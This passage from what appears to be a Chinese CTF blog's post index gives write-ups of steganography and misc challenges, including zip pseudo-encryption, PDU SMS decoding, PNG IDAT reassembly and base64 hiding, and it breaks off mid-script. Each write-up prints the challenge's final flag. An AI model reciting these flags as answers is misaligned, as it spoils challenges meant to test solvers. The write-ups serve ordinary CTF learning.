alt="Snipaste_2022-11-17_11-19-09"></p><p><code>2.txt</code>对应<code>W0RD</code>，<code>3.txt</code>对应<code>P@Ss</code>，组合一起就是<code>W0RDP@Ss</code>，去解压这个zip，没成功。</p><p>然后我把顺序换了一下，使用<code>P@SsW0RD</code>这个密码解压就成功了！</p><ol start="2"><li>这个图片的隐写完全就是多尝试了，我也是试了好久。</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/Snipaste_2022-11-18_08-38-16.png" alt="Snipaste_2022-11-18_08-38-16"></p><p>为什么要这样？因为bmp里面没有密码可以更改了，而且提示是<code>带密码的eye</code>，但是bmp就没有密码修改的地方，所以我想起来了之前bugku做的一道题目，就是用了上面的手段，题目叫什么我忘记了。</p><p>所以我就各种尝试，最后试出来了：<code>Image quality: normal，Type:AES256，Key:P@SsW0RD</code>。</p><ol start="3"><li>这一步的时候，<code>flag.txt</code>是加密的，而<code>看好你.jpg</code>是没有加密的。</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221118101734485.png" alt="image-20221118101734485"></p><ol start="4"><li>大胆猜测伪加密，直接010editor改了一下</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221118101852038.png" alt="image-20221118101852038"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221118101907400.png" alt="image-20221118101907400"></p><ol start="5"><li>现在一看就没有密码了吧</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221118101628301.png" alt="image-20221118101628301"></p><ol start="6"><li><code>flag.txt</code>内容如下：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3(%2 .V%QSQTP KRPV_K&quot; &#x27;RKPWS KWQ%Q&#x27;W$QWPS&quot;.</span><br></pre></td></tr></table></figure><p>还有一张图片<code>看好你.jpg</code>：</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221118102027050.png" alt="image-20221118102027050"></p><ol start="7"><li>我还以为还有隐写，试了很多工具，试了<code>3(%2 .V%QSQTP KRPV_K&quot; &#39;RKPWS KWQ%Q&#39;W$QWPS&quot;.</code>和<code>P@SsW0RD</code>作为密码，都没成功，又卡住了。</li><li>我就试了rot47甚至在cyberchef中各种尝试</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221118102312623.png" alt="image-20221118102312623"></p><ol start="9"><li>我也试过xortool，不太行，可能是因为这个的字符太少了；最后原来还是xor。</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221118102431802.png" alt="image-20221118102431802"></p><p><strong>UNCTFH0C75726F-4609-DFA4-615F-17C7A1B7165DH</strong></p><ol start="10"><li>这个一看就是uuid生成的flag，根据uuid的格式<code>8-4-4-4-12</code>，很明显就能知道，需要替换那两个英文字符喽！</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221118102610140.png" alt="image-20221118102610140"></p><p><strong>UNCTF{0C75726F-4609-DFA4-615F-17C7A1B7165D}</strong></p>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[CISCN 2021初赛]：隔空传话</title>
      <link href="/posts/52518.html"/>
      <url>/posts/52518.html</url>
      
        <content type="html"><![CDATA[<h1 id="CISCN-2021初赛-隔空传话"><a href="#CISCN-2021初赛-隔空传话" class="headerlink" title="[CISCN 2021初赛]隔空传话"></a>[CISCN 2021初赛]隔空传话</h1><p>本次复现基于WP：<code>https://www.cnblogs.com/yunqian2017/p/14786240.html</code></p><p>特别感谢仓库：<code>https://github.com/emilsedgh/pdu</code>, <code>https://github.com/doloopwhile/PyExecJS</code></p><ol><li><p>使用网站：<a href="http://www.sendsms.cn/pdu/%EF%BC%8C%E5%A4%8D%E5%88%B6%60data.txt%60%E7%9A%84%E7%AC%AC%E4%B8%80%E8%A1%8C%E8%BF%9B%E5%8E%BB%EF%BC%8C%E7%84%B6%E5%90%8E%E8%BD%AC%E6%8D%A2%E4%B8%80%E4%B8%8B%E3%80%82">http://www.sendsms.cn/pdu/，复制`data.txt`的第一行进去，然后转换一下。</a></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221114143731403.png" alt="image-20221114143731403"></p></li></ol><p><code>data.txt</code>的前4行对话如下：</p><blockquote><p><code>+8615030442000</code>：hello,bob!what is the flag?</p><p><code>+10086</code>：the first part of the flag is the first 8 digits of your phone number</p><p><code>+8615030442000</code>：那其他部分呢</p><p><code>+8615030442000</code>：看看你能从这些数据里发现什么？w465</p></blockquote><p>所以我们得到了第一段flag为<code>15030442</code></p><br><ol start="2"><li>第二段flag是后面的pdu解码后，然后根据时间去排序，然后就能够组成一张图片，也就是图片的hex被分开很多段了，然后一段一段通过PDU发送，然后根据时间去进行排序。</li></ol><p>运行代码前需要<code>pip install pyexecjs</code>，因为需要调用dpu.js。</p><p><strong>1.get_info.py:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 运行后，得到out.json，里面存的是 [[时间戳,pdu解码内容], ..]</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> execjs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./pdu-master/pdu.js&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    js_code = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./data.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read().splitlines()</span><br><span class="line"></span><br><span class="line">context = execjs.<span class="built_in">compile</span>(js_code)</span><br><span class="line"></span><br><span class="line">infos = []</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> data[<span class="number">4</span>:]:</span><br><span class="line">    sms_info = context.call(<span class="string">&#x27;pduParser.parse&#x27;</span>, line)</span><br><span class="line">    text = sms_info[<span class="string">&#x27;text&#x27;</span>].replace(<span class="string">&quot;\x00&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    times = time.mktime(time.strptime(sms_info[<span class="string">&quot;time&quot;</span>][:-<span class="number">5</span>], <span class="string">r&quot;%Y-%m-%dT%H:%M:%S&quot;</span>))</span><br><span class="line">    infos.append([times, text])</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;out.json&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    json.dump(infos, f)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>2.get_file.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 运行后，就得到了flag.png</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;out.json&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = json.load(f)</span><br><span class="line">    data = <span class="built_in">sorted</span>(data, key=<span class="keyword">lambda</span> x: x[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">hex_str = <span class="string">&#x27;&#x27;</span>.join(i[-<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> data)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.png&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(hex_str), <span class="number">2</span>):</span><br><span class="line">        f.write(<span class="built_in">int</span>(hex_str[i:i+<span class="number">2</span>], <span class="number">16</span>).to_bytes(<span class="number">1</span>, byteorder=<span class="string">&quot;big&quot;</span>))</span><br></pre></td></tr></table></figure><br><ol start="3"><li>PNG宽高问题</li></ol><p>这个地方不太会的可以去看我之前的博文，链接：<a href="https://blog.csdn.net/qq_47875210/article/details/126171502?spm=1001.2014.3001.5501">https://blog.csdn.net/qq_47875210/article/details/126171502?spm=1001.2014.3001.5501</a></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221114145604999.png" alt="image-20221114145604999"></p><p>宽度：465，高度：63，这也对应了<code>看看你能从这些数据里发现什么？w465</code>，w465也就是width&#x3D;465的意思了。</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221114145634423.png" alt="image-20221114145634423"></p><p>水平翻转再垂直翻转就好了</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221114145700829.png" alt="image-20221114145700829"></p><p>第一段flag和第二段拼一下：</p><p><strong>flag{15030442_b586_4c9e_b436_26def12293e4}</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-难度8-happy_puzzle</title>
      <link href="/posts/34869.html"/>
      <url>/posts/34869.html</url>
      
        <content type="html"><![CDATA[<h1 id="攻防世界-happy-puzzle"><a href="#攻防世界-happy-puzzle" class="headerlink" title="攻防世界_happy_puzzle"></a>攻防世界_happy_puzzle</h1><p>题目来源：UNCTF</p><p>打开后：</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221111220416029.png" alt="image-20221111220416029"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221111220430891.png" alt="image-20221111220430891"></p><p>出题人考察的，让我们构建一个RGB，400x400的png图片，然后第一张图片里面26个，都是png的IDAT结构。</p><p>IDAT结构：<code>IDAT_DATA的长度 + IDAT + IDAT_DATA + CRC32</code>，<code>CRC32 = IDAT + IDAT_DATA</code></p><p>文件头 + IHDR结构：<code>89 50 4E 47 0D 0A 1A 0A</code> + <code>00 00 00 0D + IHDR + IM_WIDTH + IM_HEIGHT + Bits + color_type + compr_method + filter_method + interlace_method  + CRC32 </code>，<code>CRC32 = IHDR + IM_WIDTH + IM_HEIGHT + Bits + color_type + compr_method + filter_method + interlace_method</code>，对应下面的create_head()代码。</p><p>IEND结构：<code>00 00 00 00 49 45 4E 44 AE 42 60 82</code>，对应下面的create_tail()代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">png_head = <span class="string">&quot;89 50 4E 47 0D 0A 1A 0A 00 00 00 0D&quot;</span></span><br><span class="line">png_tail = <span class="string">&quot;00 00 00 00 49 45 4E 44 AE 42 60 82&quot;</span></span><br><span class="line">idat = <span class="string">&quot;49 44 41 54&quot;</span></span><br><span class="line">WIDTH, HEIGHT = <span class="number">400</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_head</span>():</span><br><span class="line">    head = binascii.a2b_hex(<span class="string">&#x27;&#x27;</span>.join(png_head.split(<span class="string">&quot; &quot;</span>)))</span><br><span class="line">    ihdr = binascii.a2b_hex(<span class="string">&#x27;&#x27;</span>.join(<span class="string">&quot;49 48 44 52&quot;</span>.split(<span class="string">&quot; &quot;</span>)))</span><br><span class="line">    width = WIDTH.to_bytes(<span class="number">4</span>, byteorder=<span class="string">&quot;big&quot;</span>)</span><br><span class="line">    height = HEIGHT.to_bytes(<span class="number">4</span>, byteorder=<span class="string">&quot;big&quot;</span>)</span><br><span class="line">    info = binascii.a2b_hex(<span class="string">&#x27;&#x27;</span>.join(<span class="string">&quot;08 02 00 00 00&quot;</span>.split(<span class="string">&quot; &quot;</span>)))</span><br><span class="line">    crc32 = binascii.crc32(ihdr + width + height +</span><br><span class="line">                           info).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&quot;big&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> head + ihdr + width + height + info + crc32</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_IDAT</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    length = <span class="built_in">len</span>(data).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&quot;big&quot;</span>)</span><br><span class="line">    idat_head = binascii.a2b_hex(<span class="string">&#x27;&#x27;</span>.join(idat.split(<span class="string">&quot; &quot;</span>)))</span><br><span class="line">    crc32 = binascii.crc32(idat_head + data).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&quot;big&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> length + idat_head + data + crc32</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_tail</span>():</span><br><span class="line">    <span class="keyword">return</span> binascii.a2b_hex(<span class="string">&#x27;&#x27;</span>.join(png_tail.split(<span class="string">&quot; &quot;</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    head = create_head()</span><br><span class="line">    tail = create_tail()</span><br><span class="line"></span><br><span class="line">    all_idta = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> file_path <span class="keyword">in</span> [<span class="string">&quot;./puzzle/yvxmeawg.data&quot;</span>, <span class="string">&quot;./puzzle/rnydeiho.data&quot;</span>, <span class="string">&quot;./puzzle/uozjmdnl.data&quot;</span>, <span class="string">&quot;./puzzle/fhnkotmb.data&quot;</span>,</span><br><span class="line">              <span class="string">&quot;./puzzle/jlxphwfm.data&quot;</span>, <span class="string">&quot;./puzzle/yscijlzx.data&quot;</span>, <span class="string">&quot;./puzzle/ciaoxptf.data&quot;</span>, <span class="string">&quot;./puzzle/blczioav.data&quot;</span>,</span><br><span class="line">              <span class="string">&quot;./puzzle/jtxsbevz.data&quot;</span>, <span class="string">&quot;./puzzle/lstjobzi.data&quot;</span>, <span class="string">&quot;./puzzle/pyusgabf.data&quot;</span>, <span class="string">&quot;./puzzle/wgkapjbh.data&quot;</span>,</span><br><span class="line">              <span class="string">&quot;./puzzle/xufbyndk.data&quot;</span>, <span class="string">&quot;./puzzle/csizrgxn.data&quot;</span>, <span class="string">&quot;./puzzle/oaeqnubi.data&quot;</span>, <span class="string">&quot;./puzzle/gpiuezjw.data&quot;</span>,</span><br><span class="line">              <span class="string">&quot;./puzzle/tihzkoyu.data&quot;</span>, <span class="string">&quot;./puzzle/hbctmwqj.data&quot;</span>, <span class="string">&quot;./puzzle/ycqzmbrw.data&quot;</span>, <span class="string">&quot;./puzzle/fkjhepcs.data&quot;</span>,</span><br><span class="line">              <span class="string">&quot;./puzzle/kczwtlrd.data&quot;</span>, <span class="string">&quot;./puzzle/dwelszrk.data&quot;</span>, <span class="string">&quot;./puzzle/uilqywot.data&quot;</span>, <span class="string">&quot;./puzzle/xufnmacj.data&quot;</span>,</span><br><span class="line">              <span class="string">&quot;./puzzle/jrbiznkl.data&quot;</span>, <span class="string">&quot;./puzzle/mrxtfkzj.data&quot;</span>]:</span><br><span class="line">              all_idta += get_IDAT(file_path)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.png&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(head + all_idta + tail)</span><br></pre></td></tr></table></figure><p>关于IDAT层的顺序问题，如果你拼对了一层，那一层就会显示出来，如下图：</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221111221331255.png" alt="image-20221111221331255"></p><p>不要考虑爆破，我已经试了一下，太多情况了。</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221111221402019.png" alt="image-20221111221402019"></p><p>这个肯定是末尾的IDAT了，因为IDAT必须要满了才会开始一下个IDAT，这个明显就是末尾的IDAT了。</p><br><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221111221503240.png" alt="image-20221111221503240"></p><p><strong>unctf{312bbd92c1b291e1827ba519326b6688}</strong></p><p>注意：</p><p>攻防世界设置错了，设置成了：</p><p><strong>unctf{312bbd92c1b891e1827ba519326b6688}</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-[XSCTF联合招新赛（初赛）]：不确定,再看看</title>
      <link href="/posts/55092.html"/>
      <url>/posts/55092.html</url>
      
        <content type="html"><![CDATA[<h1 id="不确定-再看看"><a href="#不确定-再看看" class="headerlink" title="不确定,再看看"></a>不确定,再看看</h1><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221110170830784.png" alt="image-20221110170830784"></p><p>先给了，一个音频，拖到SilentEye报错了。我就去看文件格式了，大概是看到了一个base的特征，再加上出题人说的base64，肯定是提取这个音频里面的base64了。</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221110170702509.png" alt="image-20221110170702509"></p><br><p>​1.提取base64文本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;A Comme Amour.wav&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()[<span class="number">0x86</span>:<span class="number">0x2eea</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data), <span class="number">2</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(data[i]), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><br><ol start="2"><li><p>复制到CyberChef中</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221110171128402.png" alt="image-20221110171128402"></p></li></ol><p>这个<code>AffineTransformation</code>，自然而然想到仿射密码了。</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221110171212998.png" alt="image-20221110171212998"></p><p>末尾给了加密后的密文<code>xtws&#123;fnik_ik_xwyc_xtws_teey_rwkc!&#125;</code>，key给没给我不清楚，不太会c语言，加上这个排版，我更懒得看代码了。</p><br><ol start="3"><li><p>直接写脚本爆破key就好了，没有库的要先安装一下，命令行<code>pip install pycipher</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pycipher <span class="keyword">import</span> Affine</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cihper_text = <span class="string">&quot;xtws&#123;fnik_ik_xwyc_xtws_teey_rwkc!&#125;&quot;</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">26</span>, <span class="number">2</span>):</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            plan_text = Affine(a, b).decipher(cihper_text)</span><br><span class="line">            <span class="keyword">if</span> plan_text.startswith(<span class="string">&quot;FLAG&quot;</span>):</span><br><span class="line">                <span class="built_in">print</span>(plan_text)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">运行结果：</span><br><span class="line">FLAGTHISISFAKEFLAGLOOKBASE</span><br></pre></td></tr></table></figure><p>FLAG{THIS_IS_FAKE_FLAG_LOOK_BASE}</p><br><ol start="4"><li><p>这是个假的旗帜，让我去看base，既然是base64，第一想法base64隐写喽</p><p>工具是我在Github开源的，链接：<code>https://github.com/Byxs20/Base64-Tools</code>，右边的Release下载即可食用~</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221110171551777.png" alt="image-20221110171551777"></p></li></ol></li></ol><p><strong>flag{ba5e64_hiding_1s_s0_in7erest1ng!}</strong></p><p><strong>如果他没有弄这个仿射密码，我平时碰到base64肯定就上工具了，出题人把我拿捏死死的！！！</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-[江苏工匠杯]：看雪看雪看雪</title>
      <link href="/posts/8262.html"/>
      <url>/posts/8262.html</url>
      
        <content type="html"><![CDATA[<h1 id="看雪看雪看雪"><a href="#看雪看雪看雪" class="headerlink" title="看雪看雪看雪"></a>看雪看雪看雪</h1><p>之前做过一次，没做出来，今天下载过来试试，看到rar，突然想到了，之前既然没有找到图片的隐写，是不是有ntfs，果然扫描就出现了4个文件，全部保存。</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221110163624052.png" alt="image-20221110163624052"></p><p>其中一个文件有这么多空格和tab，再加上看雪，大概率是snow隐写了，其他的文件用sublimetext打开分别是<code>他朝</code>，<code>若是</code>，<code>同淋雪</code></p><br><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221110163756127.png" alt="image-20221110163756127"></p><p>flag{Sn0w_M@n!!!!!!!}</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTFSHOW-MISC入门-MISC57~MISC61</title>
      <link href="/posts/18672.html"/>
      <url>/posts/18672.html</url>
      
        <content type="html"><![CDATA[<p>本文章使用的是 <a href="https://github.com/g4simon/tsteg">g4simon&#x2F;tsteg</a> ，需要自己去下载配置好！</p><h1 id="misc57"><a href="#misc57" class="headerlink" title="misc57"></a>misc57</h1><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221110120913309.png" alt="image-20221110120913309"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221110120924637.png" alt="image-20221110120924637"></p><p>0123，刚刚好也符合使用<code>StegSolve</code>观察到的！</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221110121050967.png" alt="image-20221110121050967"></p><p>提取<code>misc57.zlib</code></p><ol><li>第一种方法使用binwalk解压</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221110121147654.png" alt="image-20221110121147654"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221110121159810.png" alt="image-20221110121159810"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221110121220656.png" alt="image-20221110121220656"></p><ol start="2"><li><p>第二种方法python</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221110121401277.png" alt="image-20221110121401277"></p></li></ol><br><h1 id="misc58"><a href="#misc58" class="headerlink" title="misc58"></a>misc58</h1><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221110121455310.png" alt="image-20221110121455310"></p><p><code>StegSolve</code>观察到的是321，并没有0，然后我使用了-a参数</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221110121545005.png" alt="image-20221110121545005"></p><p>提取<code>misc58.zlib</code></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221110121622970.png" alt="image-20221110121622970"></p><ol><li>第一种方法使用binwalk解压</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221110121723867.png" alt="image-20221110121723867"></p><ol start="2"><li>第二种方法python</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221110121819539.png" alt="image-20221110121819539"></p><br><h1 id="misc59"><a href="#misc59" class="headerlink" title="misc59"></a>misc59</h1><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221110122050203.png" alt="image-20221110122050203"></p><p>提取<code>misc59.zip</code></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221110122141591.png" alt="image-20221110122141591"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221110122221898.png" alt="image-20221110122221898"></p><br><h1 id="misc60"><a href="#misc60" class="headerlink" title="misc60"></a>misc60</h1><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221110122251453.png" alt="image-20221110122251453"></p><p>python代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&quot;./images/misc60.png&quot;</span>)</span><br><span class="line"></span><br><span class="line">bin_str = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(img.height):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(img.width):</span><br><span class="line">        rgb = img.getpixel((x, y))</span><br><span class="line">        <span class="keyword">for</span> channel <span class="keyword">in</span> rgb:</span><br><span class="line">            <span class="comment"># 1024:</span></span><br><span class="line">            <span class="comment"># 1111 1111</span></span><br><span class="line">            <span class="comment"># 7654 3210</span></span><br><span class="line">            bin_str += <span class="built_in">str</span>((channel &gt;&gt; <span class="number">1</span>) &amp; <span class="number">1</span>)</span><br><span class="line">            bin_str += <span class="built_in">str</span>(channel &amp; <span class="number">1</span>)</span><br><span class="line">            bin_str += <span class="built_in">str</span>((channel &gt;&gt; <span class="number">2</span>) &amp; <span class="number">1</span>)</span><br><span class="line">            bin_str += 